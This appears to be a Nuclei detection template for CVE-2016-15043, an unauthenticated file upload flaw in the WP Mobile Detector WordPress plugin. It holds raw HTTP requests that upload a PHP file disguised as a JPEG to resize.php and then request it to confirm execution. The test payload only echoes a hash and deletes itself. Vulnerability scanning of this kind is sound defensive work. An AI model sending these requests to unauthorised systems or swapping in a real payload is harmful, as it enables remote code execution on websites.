id: CVE-2016-15043

info:
  name: WP Mobile Detector <= 3.5 - Unrestricted File Upload
  author: D3nverNg,thewindghost
  severity: critical
  description: |
    WP Mobile Detector WordPress plugin version 3.5 and below contains an unrestricted file upload vulnerability in resize.php. 
    The vulnerability is caused by missing file type validation, allowing unauthenticated attackers to upload arbitrary files, 
    potentially leading to remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2016-15043
    - https://wpscan.com/vulnerability/
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_mobile_detector_upload_execute.rb
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2016-15043
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2016,wordpress,wp-plugin,fileupload,rce,unauth

http:
  - raw:
      - |
        POST /wp-content/plugins/wp-mobile-detector/resize.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
        
        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
        Content-Type: image/jpeg
        
        <?php echo md5("nuclei_test_{{randstr}}"); unlink(__FILE__); ?>
        ------WebKitFormBoundary--

      - |
        GET /wp-content/plugins/wp-mobile-detector/{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - '{{md5("nuclei_test_{{randstr}}")}}'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body_2
        regex:
          - '[a-f0-9]{32}'

# Alternative detection method - checking if resize.php exists and accepts uploads
  - raw:
      - |
        GET /wp-content/plugins/wp-mobile-detector/resize.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500

      - type: word
        part: body
        words:
          - 'wp-mobile-detector'
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - 'wp-mobile-detector/([0-9.]+)'
        group: 1